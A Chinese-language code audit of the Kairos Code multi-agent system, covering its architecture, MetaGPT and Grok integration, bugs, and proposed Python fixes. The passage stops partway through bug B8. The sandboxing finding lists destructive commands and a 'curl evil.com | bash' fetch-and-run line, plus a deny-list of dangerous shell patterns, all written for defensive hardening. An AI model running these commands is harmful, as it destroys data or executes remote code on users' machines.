# Kairos Code 系统完整审查报告

> **审查范围**：`<repo>`（Kairos Code v0.1.0）  
> **对照参考**：`<workspace>\MetaGPT-main\MetaGPT-main`、`<workspace>\grok_build\source`  
> **审查时间**：2026-07-18  
> **审查方法**：静态阅读 + 导入验证 + 跨文件调用链追踪  
> **报告版本**：v1.0

---

## 目录

- [0. 审查摘要](#0-审查摘要)
- [1. 系统架构](#1-系统架构)
  - [1.1 目录结构](#11-目录结构)
  - [1.2 启动链路](#12-启动链路)
  - [1.3 运行时链路](#13-运行时链路)
- [2. MetaGPT / Grok 集成合理性](#2-metagpt--grok-集成合理性)
  - [2.1 MetaGPT 集成度评估](#21-metagpt-集成度评估)
  - [2.2 Grok 集成度评估](#22-grok-集成度评估)
  - [2.3 整体架构合理性判断](#23-整体架构合理性判断)
- [3. Bug 清单](#3-bug-清单)
  - [3.1 Critical（3 个）](#31-critical3-个)
  - [3.2 Major（8 个）](#32-major8-个)
  - [3.3 Minor（13 个）](#33-minor13-个)
- [4. 设计层面问题（非具体 bug）](#4-设计层面问题非具体-bug)
- [5. 修复优先级 Roadmap](#5-修复优先级-roadmap)
- [6. 验证结果](#6-验证结果)
- [7. 关键文件速查](#7-关键文件速查)
- [8. 一句话总结](#8-一句话总结)

---

## 0. 审查摘要

| 维度 | 评分 | 说明 |
|------|------|------|
| 架构骨架 | ★★★☆ | LLM 抽象层清晰、前后端分离干净 |
| MetaGPT 集成 | ★★ | 借鉴了 Role/Message 命名，缺 Action/Environment/trigger 灵魂 |
| Grok 集成 | ★ | Rust/Python 技术栈不通，只借鉴 UI 思路 |
| 实际可用度 | ★★ | 8 角色 LLM 调度器，**不是真正能干活的多 agent 系统** |
| 关键 bug 数 | Critical 3 / Major 8 / Minor 13 | 见第 3 部分 |

**核心结论**：当前系统最大的问题是 **tools 完全没接入 agent 主循环**。B1（tools 接入）是 P0，没这个整个"协作开发"是空话。修复 P0 + P1 之后，系统才从"8 个独立 chatbot"变成"能干活的多 agent 团队"。

---

## 1. 系统架构

### 1.1 目录结构

```
<repo>\
├── kairos/                       # 核心引擎（Python 异步）
│   ├── main.py                   # uvicorn 入口
│   ├── agents/
│   │   ├── base.py               # KairosAgent 基类
│   │   └── roles/                # 8 个角色，每个文件 = 1 个 class + 硬编码 system_prompt
│   │       ├── team_leader.py
│   │       ├── product_manager.py
│   │       ├── architect.py
│   │       ├── frontend_dev.py
│   │       ├── backend_dev.py
│   │       ├── qa_engineer.py
│   │       ├── code_reviewer.py
│   │       └── devops.py
│   ├── core/
│   │   ├── message_bus.py        # 内存 pub/sub
│   │   └── orchestrator.py       # 协调器
│   ├── llm/
│   │   ├── base.py               # BaseLLMProvider + LLMConfig/Message/Response
│   │   ├── provider_registry.py  # 注册表 + create_provider
│   │   ├── model_router.py       # 按 role 路由不同模型
│   │   └── providers/
│   │       ├── openai_provider.py      # 同时注册 openai/openrouter/deepseek/dashscope/zhipuai/fireworks/siliconflow
│   │       ├── anthropic_provider.py   # httpx 直调
│   │       ├── ollama_provider.py      # 本地模型
│   │       └── deepseek_provider.py    # 复用 OpenAIProvider
│   ├── tools/                    # ⚠️ 写了但没接入
│   │   ├── base.py               # BaseTool + ToolResult
│   │   ├── file_read.py
│   │   ├── file_edit.py          # FileEditTool + FileEditReplaceTool
│   │   └── terminal.py
│   ├── review/
│   │   └── engine.py             # ReviewEngine
│   └── config/
│       ├── settings.py           # pydantic-settings
│       ├── models_config.yaml    # ✓ 被读
│       └── agents_config.yaml    # ✗ 不被读（B2）
├── api/                          # FastAPI
│   ├── app.py                    # 5 个 router 挂载
│   ├── deps.py                   # 单例 orchestrator
│   ├── routes/                   # agents / projects / review / config / websocket
│   └── schemas/agent.py
├── web/                          # React + TS + Antd + Zustand
│   ├── src/pages/                # Dashboard/Project/Collaboration/Review/Settings
│   ├── src/stores/agentStore.ts  # zustand
│   └── src/api/client.ts         # axios + WS
├── data/settings.json            # 唯一持久化（API key + role_mappings）
├── workspace/                    # 项目子目录
├── start.bat / start.ps1 / start.vbs / start_silent.bat
├── stop.bat / stop_silent.bat / stop.vbs
└── watchdog.bat
```

### 1.2 启动链路

```
start.bat / start.vbs
   ↓
1. 创建 .venv（如不存在）
2. pip install -e .   （kairos + api 两个包）
3. npm install        （如 web/node_modules 不存在）
4. python -m kairos.main  → uvicorn 监听 :8900
5. node node_modules/vite/bin/vite.js --host  → vite 监听 :3000
   （被 vite.config.ts 代理 /api 和 /ws 到 :8900）
6. watchdog.bat 监控 vite 进程，vite 死了就杀 backend
```

### 1.3 运行时链路

```
Browser (:3000)
   ↓ axios
Vite proxy
   ↓ /api/*
FastAPI (:8900)
   ↓
api/routes/*.py  →  api/deps.py 单例 orchestrator
   ↓
Orchestrator.chat_with_agent(project_id, role, msg)
   ↓
agent.chat(msg)  →  KairosAgent
   ↓ self._llm.complete(messages)
ModelRouter.get_provider_for_role(role)  →  每次重读 settings.json
   ↓
ProviderRegistry.create_provider(config)
   ↓
OpenAIProvider / AnthropicProvider / OllamaProvider.complete()
   ↓ httpx / openai SDK
Upstream LLM API
```

---

## 2. MetaGPT / Grok 集成合理性

### 2.1 MetaGPT 集成度评估

| MetaGPT 核心概念 | Kairos 实现 | 评估 |
|----------------|------------|------|
| Role（带 profile + context） | `KairosAgent` + 8 个 Role 子类，硬编码 system_prompt | ✅ 基本对齐 |
| Action（带指令 + 输出） | **完全没有** | ❌ 缺 |
| Environment / Message 触发下一个 Action | **没有**。`MessageBus.publish` 只发到 listener/queue，**没有 trigger 任何 agent 自动执行** | ❌ 缺 MetaGPT 灵魂 |
| Memory（角色级 + 全局） | `KairosAgent._memory`（仅本角色），无 token 计数 | ⚠️ 半成品 |
| Message / pub-sub | `MessageBus` 内存实现 | ✅ 命名一致，逻辑简单 |
| Document / Artifact（结构化产出） | **没有**。LLM 输出是裸字符串 | ❌ 缺 |
| Team 投资组合（不同模型给不同角色） | `ModelRouter` 按 role 映射 | ✅ 这个做得不错 |

**结论**：**形式上像 MetaGPT，实质上只是"8 个带不同 system_prompt 的 LLM 客户端 + 一个内存 pub/sub"**。  
没有 trigger 机制 = 所谓"协作"是假的（B6）。

### 2.2 Grok 集成度评估

`<workspace>\grok_build\source` 是 **xAI Grok Code（Rust 写的 CLI/Agent）**，与 Python 框架 Kairos 技术栈不通。**不存在代码级集成的可能**。

Kairos README 自称"整合了 MetaGPT 的多 Agent 协作框架和 Grok Build 的工具能力"——这里的"整合"只能理解为**借鉴设计模式**，不是 import 复用：

| Grok 设计模式 | Kairos 是否借鉴 |
|--------------|----------------|
| Chat + Tool 循环 | ❌ **没有实现**（B1） |
| 工具沙箱（deny list、路径限制） | ❌ 完全没有（B3） |
| 流式 UI / reasoning effort | ❌ 没有（Provider 有 `stream()` 方法但未用上） |
| 单 LLM actor + 消息事件 | ⚠️ 概念类似（`KairosAgent` 循环 + `MessageBus`） |
| 滚动 buffer / context 管理 | ❌ 没有（B7） |

**结论**：Grok 这边借鉴了"单 actor + 消息事件"的概念，但**关键的 tool loop 和沙箱都没做**。

### 2.3 整体架构合理性判断

| 设计点 | 评价 |
|--------|------|
| LLM Provider 抽象 + 注册表 | ✅ 干净，可扩展。Anthropic 用 httpx 直调，OpenAI 用 SDK，Ollama 用 httpx——三种风格并存但都注册到统一接口 |
| ModelRouter 按角色路由 | ✅ 思路对，5 个 yaml 预设（default/creative/precise/fast/local） |
| WebSocket 实时推送 | ✅ 有，但实现有问题（B10） |
| 项目隔离（Project 包含 agents） | ✅ 设计正确，但实际没怎么用（B5/B6） |
| tools 抽象（BaseTool + ToolResult） | ✅ 抽象对，但**没接入**（B1） |
| 持久化 | ❌ **缺失严重**（B4）——只 settings.json |

**架构大方向对，但关键集成层全部断链**。

---

## 3. Bug 清单

> **严重度分级**：
> - 🔴 **Critical** — 核心功能不可用 / 安全风险 / 数据损坏
> - 🟠 **Major** — 影响业务可用性 / 数据可靠性
> - 🟡 **Minor** — 体验 / 性能 / 可维护性

### 3.1 Critical（3 个）

---

#### B1.【Critical】Tools 整套完全没接入 agent 主循环

**位置**：
- `kairos/agents/base.py:56,69,76,160-165`（`KairosAgent` 接收 tools 但没用）
- `kairos/core/orchestrator.py:90-95`（创建 agent 时没传 tools）
- `kairos/llm/providers/*.py`（所有 provider 的 `complete()` 都没接 `tools` 参数）

**问题**：
1. `tools/file_read.py`、`file_edit.py`、`terminal.py` 完整实现了 `BaseTool.execute()`，但 `KairosAgent.__init__` 收到 `tools=...` 后只是存到 `self.tools`，**没有任何方法调用它**
2. `Orchestrator._create_team` 创建 8 个 role 时**根本没传 tools**（`role_class(agent_id=..., llm_config=..., message_bus=...)`）
3. `_process_response` 默认实现直接 `return response`（base.py:160），**没有 tool_call 解析、循环、注入**
4. Provider 的 `complete(messages, temperature, max_tokens)` **没接 `tools` 参数**，所以即使 LLM 想调工具，OpenAI function-calling / Anthropic tool_use 协议都没启用

**影响**：
- 所有"Backend Dev 写代码"、"DevOps 写 Dockerfile"都只是返回文本字符串
- **agent 根本动不了 `project.work_dir` 里一个文件**
- 整个"多 agent 协作开发"是空话——用户跑下来只会看到 Team Leader 输出计划文本，其他 7 个 agent 永远 `idle`

**修复方向**：

```python
# 1) BaseLLMProvider.complete() 加 tools 参数
async def complete(
    self,
    messages: List[LLMMessage],
    tools: Optional[List[dict]] = None,
    temperature: Optional[float] = None,
    max_tokens: Optional[int] = None,
) -> LLMResponse:
    """Send a completion request and return the response."""
    ...

# 2) OpenAIProvider 透传 tools
async def complete(self, messages, tools=None, temperature=None, max_tokens=None):
    response = await self._client.chat.completions.create(
        model=self.config.model,
        messages=format_messages_for_openai(messages),
        tools=tools,   # ← 加上
        temperature=temperature or self.config.temperature,
        max_tokens=max_tokens or self.config.max_tokens,
    )

# 3) AnthropicProvider 透传 tools
async def complete(self, messages, tools=None, temperature=None, max_tokens=None):
    payload = {
        "model": self.config.model,
        "max_tokens": max_tokens or self.config.max_tokens,
        "messages": converted,
    }
    if tools:
        payload["tools"] = tools   # ← 加上

# 4) KairosAgent.run() 改成 tool-calling 循环
async def run(self, task: AgentTask) -> str:
    self.current_task = task
    self.status = AgentStatus.THINKING

    if not self._llm_config.api_key or self._llm_config.api_key == "sk-placeholder":
        self.status = AgentStatus.ERROR
        return "No API key configured."

    try:
        user_message = LLMMessage(role="user", content=self._build_task_prompt(task))
        self._memory.append(user_message)
        tool_schemas = [t.to_schema() for t in self.tools] if self.tools else None

        # Tool-calling loop
        for turn in range(self._max_tool_turns):  # 防止无限循环
            messages = (
                [LLMMessage(role="system", content=self.system_prompt)]
                + self._memory[-self._max_memory:]
            )
            response = await self._llm.complete(messages, tools=tool_schemas)

            # 把 LLM 文字输出记入 memory
            if response.content:
                self._memory.append(LLMMessage(role="assistant", content=response.content))

            # 没有 tool_calls 就退出
            if not response.tool_calls:
                result = response.content
                break

            # 执行每个 tool call
            for tc in response.tool_calls:
                tool_result = await self._dispatch_tool(tc)
                self._memory.append(LLMMessage(
                    role="tool",
                    content=tool_result.output,
                    tool_call_id=tc.id,
                    name=tc.name,
                ))
        else:
            result = "Tool call limit reached."

        task.status = "completed"
        task.result = result
        self.status = AgentStatus.IDLE
        await self.message_bus.publish(Message(
            sender=self.agent_id, topic="task.result",
            content=result, msg_type="result",
            metadata={"task_id": task.id},
        ))
        return result

    except Exception as e:
        self.status = AgentStatus.ERROR
        task.status = "failed"
        task.result = str(e)
        await self.message_bus.publish(Message(
            sender=self.agent_id, topic="task.error",
            content=str(e), msg_type="error",
            metadata={"task_id": task.id},
        ))
        return f"Error: {e}"

    finally:
        self.current_task = None

async def _dispatch_tool(self, tool_call) -> ToolResult:
    """根据 tool_call.name 找到对应 tool 执行。"""
    for tool in self.tools:
        if tool.name == tool_call.name:
            args = json.loads(tool_call.arguments) if isinstance(tool_call.arguments, str) else tool_call.arguments
            return await tool.execute(**args)
    return ToolResult(success=False, output="", error=f"Unknown tool: {tool_call.name}")

# 5) Orchestrator._create_team 传 tools
def _create_team(self, project: Project):
    role_classes = {
        "team_leader": TeamLeader,
        "product_manager": ProductManager,
        # ...
    }
    tools = [
        FileReadTool(),
        FileEditTool(),
        FileEditReplaceTool(),
        TerminalTool(allowed_cwd=project.work_dir),  # 沙箱锁定 work_dir
    ]
    for role_name, role_class in role_classes.items():
        agent_id = f"{project.id}.{role_name}"
        provider = self.model_router.get_provider_for_role(role_name)
        llm_config = provider.config
        agent = role_class(
            agent_id=agent_id,
            llm_config=llm_config,
            message_bus=self.message_bus,
            tools=tools,   # ← 加上
        )
        self._agents[agent_id] = agent
        project.agents[agent_id] = agent
```

**优先级**：**P0**

---

#### B2.【Critical】`agents_config.yaml` 是死配置

**位置**：
- `kairos/config/agents_config.yaml`（3798 字节，定义 8 个 role 的 name/description/system_prompt）
- `kairos/agents/roles/*.py`（每个文件顶部常量 `SYSTEM_PROMPT = "..."`，与 yaml 重复）

**问题**：
- 全代码库 `grep` 不到任何 `agents_config` 的引用（除 venv 内的）
- 实际生效的 system_prompt 是每个 role .py 文件里硬编码的常量字符串
- 编辑 yaml 不生效，**用户想调整 prompt 只能改 .py 文件并重启**

**影响**：
- yaml 文件的存在让用户误以为可以"配置"，实际改完发现没生效
- system_prompt 散落在 8 个 .py 文件里，**改一个角色要打开一个文件**，UX 差

**修复**：

```python
# kairos/core/orchestrator.py
import yaml
from pathlib import Path

DEFAULT_PROMPTS: Dict[str, str] = {}  # 从各 role .py 里 import

def _create_team(self, project: Project):
    # 1) 读 yaml 覆盖
    yaml_path = Path(__file__).parent.parent / "config" / "agents_config.yaml"
    role_overrides: Dict[str, dict] = {}
    if yaml_path.exists():
        cfg = yaml.safe_load(yaml_path.read_text(encoding="utf-8"))
        role_overrides = cfg.get("roles", {}) or {}

    role_classes = {
        "team_leader": TeamLeader,
        "product_manager": ProductManager,
        # ...
    }
    for role_name, role_class in role_classes.items():
        # 优先用 yaml 的 system_prompt，没有就 fallback 到 class 默认
        custom_prompt = role_overrides.get(role_name, {}).get("system_prompt")
        agent_kwargs = {}
        if custom_prompt:
            agent_kwargs["system_prompt"] = custom_prompt

        agent_id = f"{project.id}.{role_name}"
        provider = self.model_router.get_provider_for_role(role_name)
        agent = role_class(
            agent_id=agent_id,
            llm_config=provider.config,
            message_bus=self.message_bus,
            tools=tools,
            **agent_kwargs,
        )
```

并把 role .py 文件里的 `SYSTEM_PROMPT` 常量改为 `__init__` 参数（已经是了，`team_leader.py:31` 等已经接受 `system_prompt`——只是 yaml 没传）。

**优先级**：P1（接 B1 一起改）

---

#### B3.【Critical】TerminalTool 完全没有沙箱

**位置**：`kairos/tools/terminal.py:11-56`

**问题**：
- `execute(self, command: str, cwd: Optional[str])` 直接 `asyncio.create_subprocess_shell(command, cwd=cwd)`
- `cwd` 可指定任意路径
- `command` 任意 shell 都能跑
- 没 deny list、没路径白名单、没超时用户配置

**场景**：
- LLM 幻觉出 `rm -rf /`（Linux/macOS）会执行
- `del /f /s C:\Windows` 会执行
- `curl http://evil.com/x | bash` 会执行
- `format C:` 会执行（虽然会要确认，但前几步已造成破坏）

**影响**：
- 一旦 B1（tool 接入）修好，这个就是高危敞口
- 任何用户输入或 LLM 错误输出都可能直接破坏系统

**修复**：

```python
# kairos/tools/terminal.py
import re
from pathlib import Path

class TerminalTool(BaseTool):
    """Execute a shell command in a sandboxed project directory."""

    name = "terminal"
    description = (
        "Execute a shell command inside the project work directory. "
        "Args: command (str)"
    )
    max_output = 10000

    # 危险命令黑名单（大小写不敏感，跨平台）
    DENY_PATTERNS = [
        r"rm\s+-rf\s+[/~]",                       # rm -rf / 或 ~
        r"rm\s+-rf\s+\*",                          # rm -rf *
        r"del\s+/[fFsS].*C:\\",                    # del /f /s C:\
        r"format\s+[C-Z]:",                        # format C:
        r":\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:",  # fork bomb
        r"curl\s+.*\|\s*(bash|sh|powershell|cmd)",  # curl pipe to shell
        r"reg\s+delete",                           # 删注册表
        r"diskpart",                               # 磁盘分区
        r"bcdedit",                                # 启动项
        r"shutdown",                               # 关机
    ]

    def __init__(self, allowed_cwd: str | Path):
        """锁定 cwd 在 allowed_cwd 之内，不允许 shell 跑出这个目录。"""
        self._allowed_cwd = Path(allowed_cwd).resolve()
        self._allowed_cwd.mkdir(parents=True, exist_ok=True)

    def _is_safe_command(self, command: str) -> Optional[str]:
        for pat in self.DENY_PATTERNS:
            if re.search(pat, command, re.IGNORECASE):
                return pat
        return None

    def _resolve_cwd(self, cwd: Optional[str]) -> Path:
        target = Path(cwd).resolve() if cwd else self._allowed_cwd
        # 必须落在 allowed_cwd 内
        try:
            target.relative_to(self._allowed_cwd)
        except ValueError:
            raise PermissionError(f"cwd outside allowed path: {target}")
        return target

    async def execute(
        self,
        command: str = "",
        cwd: Optional[str] = None,
        timeout: float = 60.0,
        **kwargs,
    ) -> ToolResult:
        if not command:
            return ToolResult(success=False, output="", error="No command provided")

        # 1. 黑名单
        blocked = self._is_safe_command(command)
        if blocked:
            return ToolResult(
                success=False,
                output="",
                error=f"Command blocked by safety policy: pattern={blocked}",
            )

        # 2. cwd 锁定
        try:
            safe_cwd = self._resolve_cwd(cwd)
        except PermissionError as e:
            return ToolResult(success=False, output="", error=str(e))

        # 3. 执行
        try:
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=str(safe_cwd),
            )
            try:
                stdout, stderr = await asyncio.wait_for(
                    process.communicate(), timeout=timeout
                )
            except asyncio.TimeoutError:
                process.kill()
                await process.wait()
                return ToolResult(success=False, output="", error=f"Command timed out after {timeout}s")

            output = stdout.decode("utf-8", errors="replace")
            error_output = stderr.decode("utf-8", errors="replace")
            if len(output) > self.max_output:
                output = output[:self.max_output] + "\n... (truncated)"
            if len(error_output) > self.max_output:
                error_output = error_output[:self.max_output] + "\n... (truncated)"

            combined = output
            if error_output:
                combined += f"\n[stderr]\n{error_output}"

            return ToolResult(
                success=process.returncode == 0,
                output=combined,
                error=error_output if process.returncode != 0 else None,
                metadata={"return_code": process.returncode, "cwd": str(safe_cwd)},
            )
        except Exception as e:
            return ToolResult(success=False, output="", error=str(e))
```

并且在 `Orchestrator._create_team` 把 `TerminalTool(allowed_cwd=project.work_dir)` 注入，**不暴露 cwd 参数**给 LLM。

**优先级**：**P0**（与 B1 一起改）

---

### 3.2 Major（8 个）

---

#### B4.【Major】状态全在内存，重启即丢

**位置**：
- `kairos/core/orchestrator.py:42` `Project.tasks: List[AgentTask]`（内存 list）
- `kairos/core/message_bus.py:30` `self._history: List[Message]`
- `kairos/agents/base.py:80` `self._memory: List[LLMMessage]`
- `data/settings.json` 是**唯一**持久化（只存 API key + role_mappings）

**问题**：
- 服务器（`python -m kairos.main`）一重启，所有项目、所有 agent、所有对话历史全部清零
- 用户在 UI 上看到 projects list，重启后空白
- `web/src/pages/Project.tsx:55-58` 也没有任何"加载已存在项目"逻辑

**影响**：
- 用户的所有工作成果（项目、PRD、生成的代码思路、对话）丢失
- 这是"生产可用"和"演示原型"的分水岭

**修复**：

```python
# 新建 kairos/core/persistence.py
import sqlite3
import json
import time
from pathlib import Path
from typing import List, Optional

class Persistence:
    """SQLite-backed persistence for Kairos projects, messages, and agent memory."""

    def __init__(self, db_path: Path):
        self.db_path = db_path
        db_path.parent.mkdir(parents=True, exist_ok=True)
        self._init_schema()

    def _init_schema(self):
        with sqlite3.connect(self.db_path) as conn:
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS projects (
                    id TEXT PRIMARY KEY,
                    name TEXT NOT NULL,
                    description TEXT,
                    workspace TEXT,
                    work_dir TEXT,
                    requirements TEXT,
                    status TEXT,
                    created_at REAL,
                    updated_at REAL
                );

                CREATE TABLE IF NOT EXISTS messages (
                    id TEXT PRIMARY KEY,
                    project_id TEXT,
                    sender TEXT,
                    receiver TEXT,
                    topic TEXT,
                    content TEXT,           -- JSON
                    msg_type TEXT,
                    timestamp REAL,
                    metadata TEXT           -- JSON
                );
                CREATE INDEX IF NOT EXISTS idx_msg_ts ON messages(timestamp);

                CREATE TABLE IF NOT EXISTS agent_memory (
                    agent_id TEXT,
                    seq INTEGER,
                    role TEXT,
                    content TEXT,
                    tool_call_id TEXT,
                    PRIMARY KEY (agent_id, seq)
                );
            """)

    def save_project(self, project):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO projects
                (id, name, description, workspace, work_dir, requirements, status, created_at, updated_at)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                project.id, project.name, project.description,
                str(project.workspace), project.work_dir, project.requirements,
                project.status, project.created_at, time.time(),
            ))

    def list_projects(self) -> List[dict]:
        with sqlite3.connect(self.db_path) as conn:
            return [dict(row) for row in conn.execute("SELECT * FROM projects ORDER BY created_at DESC")]

    def save_message(self, msg):
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT OR REPLACE INTO messages
                (id, project_id, sender, receiver, topic, content, msg_type, timestamp, metadata)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                msg.id, "", msg.sender, msg.receiver, msg.topic,
                json.dumps(msg.content, ensure_ascii=False) if not isinstance(msg.content, str) else msg.content,
                msg.msg_type, msg.timestamp, json.dumps(msg.metadata, ensure_ascii=False),
            ))

    def load_messages(self, limit: int = 100) -> List[dict]:
        with sqlite3.connect(self.db_path) as conn:
            return [dict(row) for row in conn.execute(
                "SELECT * FROM messages ORDER BY timestamp DESC LIMIT ?", (limit,)
            )]
```

然后改 `Orchestrator`：
- 启动时 `Persistence.load_projects()` → 恢复
- `create_project` 同步写库
- `MessageBus.publish` 同步写库

**优先级**：P1

---

#### B5.【Major】Orchestrator 单例 + 多项目路由错乱

**位置**：
- `api/deps.py:11` `orchestrator = Orchestrator(...)` 模块加载时初始化，所有 HTTP 共享
- `api/routes/agents.py:43,67` `/api/agents/chat` 和 `/api/agents/task` 当不传 `project_id` 时，`projects = orchestrator.list_projects(); project_id = projects[0].id`——**永远取第一个**

**问题**：
- 假设用户先后建了 `Project A`（电商）和 `Project B`（爬虫）
- 用户切到 B 在聊天框问"我刚才 PRD 怎么写的"——API 实际上发给 A 的 agent
- 多项目并发时 list 顺序依赖字典序，**路由结果不可预测**

**影响**：
- 多项目用户必踩
- `project_id` 应该是必填的，不是可选的

**修复**：

```python
# api/routes/agents.py
from fastapi import Query

@router.post("/chat")
async def chat_with_agent(
    request: ChatRequest,
    project_id: str = Query(..., description="Project ID (required)"),
):
    """Chat directly with an agent."""
    try:
        response = await orchestrator.chat_with_agent(
            project_id, request.agent_role, request.message
        )
        return ChatResponse(
            agent_id=f"{project_id}.{request.agent_role}",
            agent_name=request.agent_role,
            response=response,
        )
    except ValueError as e:
        raise HTTPException(status_code=404, detail=str(e))
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

@router.post("/task")
async def assign_task(
    request: AssignTaskRequest,
    project_id: str = Query(..., description="Project ID (required)"),
):
    ...
```

Orchestrator 加 `asyncio.Lock` 保护 project.tasks 写入：

```python
import asyncio

class Orchestrator:
    def __init__(self, model_router, workspace_base):
        ...
        self._lock = asyncio.Lock()

    async def assign_task(self, project_id, agent_role, task):
        async with self._lock:
            project = self._projects.get(project_id)
            if not project:
                raise ValueError(f"Project not found: {project_id}")
            agent = project.agents.get(f"{project_id}.{agent_role}")
            if not agent:
                raise ValueError(f"Agent not found: {agent_role}")
            project.tasks.append(task)
        # 释放锁后再 run，避免长时间持锁
        return await agent.run(task)
```

并同步更新前端 `web/src/api/client.ts`，让所有 chat/task 请求都带 `project_id`。

**优先级**：P2

---

#### B6.【Major】`start_project` 只调了 Team Leader，其他 7 个 agent 全部没被触发

**位置**：`kairos/core/orchestrator.py:144-180`

**问题**：

```python
async def start_project(self, project_id, requirement):
    # ... 构造 task
    team_leader = project.agents.get(f"{project_id}.team_leader")
    plan = await team_leader.run(task)   # ← 只调了这一个
    await self.message_bus.publish(Message(
        sender=team_leader.agent_id, topic="project.plan", content=plan, ...
    ))
    return plan
```

**实际行为**：
- Team Leader 收到"分析需求 + 拆任务"，LLM 输出**一段包含"我打算让 Architect 干 X、让 Backend Dev 干 Y"的文本**
- `start_project` 把这段文本 publish 到 bus 然后 return
- **没有解析文本、没有 dispatch 给 Architect/Backend/Frontend**
- 其他 7 个 agent 永远 `idle`

**影响**：
- 这是"协作"是空话的核心证据
- 用户点 Start → Team Leader 出一段方案 → 完了
- UI 上 Collaboration 面板看到 Team Leader 单独说完就停了

**修复（推荐方案 A：结构化 JSON）**：

```python
# 1) 在 Team Leader 的 system_prompt 里加 JSON 输出规范
TEAM_LEADER_PROMPT = """
...（原有内容）...

当需要拆分任务时，必须以 JSON 格式输出（不要 Markdown 代码块，直接 JSON）：

{
  "analysis": "对需求的理解",
  "plan": "整体方案概述",
  "tasks": [
    {
      "assignee": "product_manager" | "architect" | "frontend_dev" | "backend_dev" | "qa_engineer" | "code_reviewer" | "devops",
      "title": "简短任务标题",
      "description": "详细描述"
    }
  ]
}

如果没有需要派发的子任务，输出 {"analysis": "...", "plan": "...", "tasks": []}
"""

# 2) kairos/core/orchestrator.py
import json
import re

async def start_project(self, project_id: str, requirement: str) -> dict:
    project = self._projects.get(project_id)
    if not project:
        raise ValueError(f"Project not found: {project_id}")
    project.requirements = requirement
    project.status = "working"

    team_leader = project.agents.get(f"{project_id}.team_leader")
    if not team_leader:
        raise ValueError("Team Leader not found")

    # Team Leader 产出结构化方案
    task = AgentTask(
        id=uuid.uuid4().hex[:8],
        title="Analyze Requirement and Create Development Plan",
        description=requirement,
        context={
            "project_name": project.name,
            "project_description": project.description,
            "work_dir": project.work_dir,
        },
    )
    raw = await team_leader.run(task)
    plan = self._parse_team_leader_output(raw)

    # 把方案 publish 给 UI
    await self.message_bus.publish(Message(
        sender=team_leader.agent_id,
        topic="project.plan",
        content=plan,
        msg_type="result",
        metadata={"project_id": project_id},
    ))

    # 自动派发给其他 agent
    subtasks = plan.get("tasks", []) or []
    for sub in subtasks:
        sub_task = AgentTask(
            id=uuid.uuid4().hex[:8],
            title=sub.get("title", ""),
            description=sub.get("description", ""),
            context={"from_team_leader": True, "work_dir": project.work_dir},
        )
        project.tasks.append(sub_task)
        # 异步派发，不阻塞
        asyncio.create_task(self._dispatch_subtask(project_id, sub["assignee"], sub_task))

    return plan

def _parse_team_leader_output(self, raw: str) -> dict:
    """从 Team Leader 文本中提取 JSON。失败就返回纯文本版。"""
    # 策略 1: 裸 JSON
    try:
        return json.loads(raw.strip())
    except Exception:
        pass
    # 策略 2: ```json ... ```
    m = re.search(r"```(?:json)?\s*(\{.*?\})\s*```", raw, re.DOTALL | re.IGNORECASE)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            pass
    # 策略 3: 找 {...} 块
    m = re.search(r"(\{.*\})", raw, re.DOTALL)
    if m:
        try:
            return json.loads(m.group(1))
        except Exception:
            pass
    # 全部失败：返回原始文本
    return {"analysis": raw, "plan": "", "tasks": []}

async def _dispatch_subtask(self, project_id: str, role: str, task: AgentTask):
    """派发单个子任务。"""
    try:
        await self.assign_task(project_id, role, task)
    except Exception as e:
        await self.message_bus.publish(Message(
            sender="orchestrator",
            topic="task.error",
            content=f"Failed to dispatch to {role}: {e}",
            msg_type="error",
        ))
```

**优先级**：P1

---

#### B7.【Major】`KairosAgent._memory` 无 token 计数

**位置**：`kairos/agents/base.py:79-82`

**问题**：

```python
self._memory: List[LLMMessage] = []
self._max_memory = 100  # ← 消息条数，不是 token
```

100 条对话 + system_prompt + 任务描述 + context JSON，**单轮就能超 50k tokens**。多轮之后轻松破 100k。
GPT-4o context = 128k、Claude Sonnet = 200k、DeepSeek = 64k~128k——**100 条消息就能撑爆**。

**影响**：
- 报错：`Context length exceeded`
- 静默截断：上游直接砍掉最早的消息，agent 失去关键上下文
- 用户不知道发生了什么

**修复**：

```python
# kairos/agents/base.py
import tiktoken
from typing import Tuple

class KairosAgent:
    def __init__(self, ...):
        ...
        # 粗估 token（gpt-4o 编码对所有 BPE 模型误差 < 5%）
        try:
            self._enc = tiktoken.encoding_for_model("gpt-4o")
        except Exception:
            self._enc = tiktoken.get_encoding("cl100k_base")
        self._max_tokens = 80_000   # 留 buffer 给输出
        self._keep_recent = 4       # 至少保留最近 4 条

    def _count_message_tokens(self, msg: LLMMessage) -> int:
        # 4 是 role + 包装字符的固定开销
        return len(self._enc.encode(msg.content)) + 4

    def _count_total_tokens(self, messages: List[LLMMessage]) -> int:
        return sum(self._count_message_tokens(m) for m in messages)

    def _truncate_memory(self):
        """从最旧开始丢，直到总 token 数 < 上限。"""
        while (
            len(self._memory) > self._keep_recent
            and self._count_total_tokens(self._memory) > self._max_tokens
        ):
            self._memory.pop(0)

    def _build_messages_for_llm(self) -> List[LLMMessage]:
        self._truncate_memory()
        return (
            [LLMMessage(role="system", content=self.system_prompt)]
            + self._memory[-self._max_memory:]
        )
```

并在 `run()` 和 `chat()` 里都改用 `_build_messages_for_llm()`。

可选：滚动总结策略——每 20 轮把旧 20 条压成 1 条 user/assistant 摘要。

**优先级**：P1

---

#### B8.【Major】ReviewEngine JSON 解析脆弱 + 静默吞错

**位置**：`kairos/review/engine.py:106-128`

**问题**：

```python
try:
    import json
    content = response.content
    if "```" in content:
        content = content.split("```")[1]   # ← 只取第一个代码块
        if content.startswith("json"):
            content = content[4:]
    issues_data = json.loads(content.strip())
    issues = [ReviewIssue(**item) for item in issues_data]
except Exception:
    issues = [ReviewIssue(category="MINOR", description=response.content[:500])]
```

**实际触发**：
- LLM 经常返回 ```` ```json\n[...]\n``` ```` 但有时是 ```` ```JSON\n[...]\n``` ````（大写）、`` ```\n[...]\n``` ````（无语言标记）
